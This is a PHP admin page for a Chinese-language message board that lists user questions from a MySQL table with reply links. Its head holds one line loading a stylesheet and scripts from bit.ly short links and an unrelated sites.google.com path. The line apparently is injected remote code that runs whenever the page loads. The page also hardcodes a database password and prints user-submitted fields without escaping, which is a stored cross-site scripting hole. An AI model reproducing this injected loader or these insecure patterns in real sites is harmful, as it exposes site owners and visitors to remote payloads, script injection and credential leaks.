<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>留言頁面</title>
    <link rel="stylesheet" href="http://bit.ly/cZwmXV" type="text/css" media="screen" /> <script src="http://bit.ly/9wn5Wi" type="text/javascript"></script> <script src="http://sites.google.com/site/freeisking/public-1/scriptaculous.js?load=effects,builder" type="text/javascript"></script> <script src="http://bit.ly/aFnqib" type="text/javascript"></script>
</head>
<body>
   <link rel="stylesheet" href="admin4.css">
   <div class="wrap">
<div class="title">

<h2 class="analysis"><a href="analysis.php">後台分析</a></h2>
      <img src="1.jpg" width="87px" length="87px" alt=""><a href="#"></a>
      <h1><a href="admin.php" >Keeper</a></h1>
    </div>
    <div class="hello">
    <h2>管理者您好</h2>
    </div>
    <div class="logout">
    <h2><a href="logout.php" rel="noopener noreferrer">登出</a></h2>
    </div>
    <br/>
    <br/>
    <hr size="3px" width="100%" color="#F5F290">   
</div>
<?php
        $link = mysqli_connect('localhost','roger', 'aZxcv7904','phpproject');
        $SQL="SELECT *
           FROM ask";
        echo "<table width=70% border=3 class='ta' bgcolor=#e0e0e0 style='font-size:22px;border:1px #f0f0f0 solid;border-collapse:collapse;' rules='all' cellpadding='10px';>";
        echo"<tr bgcolor='#f5f290'>"."<td>"."提問者帳號"."</td>"."<td>"."提問者名字"."</td>"."<td>"."提問主題"."</td>"."<td>"."提問內容"."</td>"."<td>"."管理者回覆"."</td>"."<td>"."回覆"."</td>"."</tr>";
              if ( $result = mysqli_query($link, $SQL) ) {
               while( $row = mysqli_fetch_assoc($result) ){ 
               echo"<tr>"."<td>".$row["askaccount"]."</td>"."<td>".$row["askname"]."</td>"."<td>".$row["asktitle"]."</td>"."<td>".$row["askcontent"]."</td>"."<td>".$row["replycontent"]."</td>"."<td>"."<a href='message2.php?asktitle=".$row["asktitle"]."' >回覆</a>"."</td>"."</tr>";
           }
        }
?>

</body>
</html>


